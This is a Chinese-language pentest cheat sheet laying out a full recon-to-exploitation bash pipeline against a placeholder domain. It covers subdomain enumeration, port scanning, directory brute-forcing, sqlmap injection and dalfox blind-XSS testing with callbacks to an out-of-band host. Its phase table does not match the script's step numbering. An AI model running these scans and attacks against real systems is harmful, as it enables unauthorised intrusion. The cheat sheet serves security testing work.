## 九、全流程一页速查

```bash
export D="example.com"
export R="$HOME/pentest/$D"
mkdir -p $R/{recon,scan,vuln,loot,evidence}

# ── 1. 子域枚举 ──
subfinder -d $D -all -silent | anew $R/recon/subs.txt
assetfinder --subs-only $D     | anew $R/recon/subs.txt
amass enum -passive -d $D -silent | anew $R/recon/subs.txt
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt $D \
    -r $R/recon/resolvers.txt --write $R/recon/brute.txt
cat $R/recon/brute.txt | anew $R/recon/subs.txt

# ── 2. DNS 解析 → IP ──
dnsx -l $R/recon/subs.txt -a -resp -silent -o $R/recon/domain_ip.txt
awk '{print $2}' $R/recon/domain_ip.txt | tr -d '[]' | sort -u > $R/recon/ips.txt

# ── 3. 存活 + 指纹 + 过滤 CDN ──
httpx -l $R/recon/subs.txt -sc -title -tech-detect -favicon -cdn -ip -threads 100 -o $R/recon/alive.txt
grep -oE 'https?://[^ ]+' $R/recon/alive.txt | sort -u > $R/recon/alive_urls.txt
grep -v '\[CDN\]' $R/recon/alive.txt | grep -oE '\[[0-9]{1,3}(\.[0-9]{1,3}){3}\]' | \
    tr -d '[]' | sort -u > $R/recon/ips_direct.txt
wafw00f -i $R/recon/alive_urls.txt -o $R/recon/waf.txt

# ── 4. 端口扫描（只扫直连 IP）──
sudo nmap -sS -p- --min-rate 2000 -T4 -iL $R/recon/ips_direct.txt -oA $R/scan/nmap_all

# ── 5. URL 与接口面 ──
gau --subs --blacklist png,jpg,css,woff $D | anew $R/recon/urls_all.txt
katana -u $(head -1 $R/recon/alive_urls.txt) -jc -d 3 -aff | anew $R/recon/urls_all.txt
grep "=" $R/recon/urls_all.txt | sort -u > $R/recon/urls_params.txt

# ── 6. 目录爆破 ──
ffuf -u https://$D/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -t 50 -rate 200 -mc 200,204,301,302,401,403 -ac -o $R/scan/ffuf.json

# ── 7. 打洞 ──
sqlmap -r $R/vuln/req.txt --batch --level 3 --risk 2          # SQLi
dalfox file $R/recon/urls_params.txt --blind https://$OAST    # XSS
interactsh-client -v                                          # 起 OAST
# 手工：越权 / SSRF / 上传 / 命令注入 / 逻辑
```

**核心理念**：

| 阶段 | 决定什么 |
|---|---|
| 1–2 资产面 | 效率上限（资产找全才有东西打） |
| 3 接口面 | 准确度（接口参数捞全才知道往哪打） |
| 4–5 漏洞 | 把已知手法套上去 |
| 6 横向 | 把一次突破变成一片控制 |
| 7 报告 | 把技术动作变成可交付结论 |

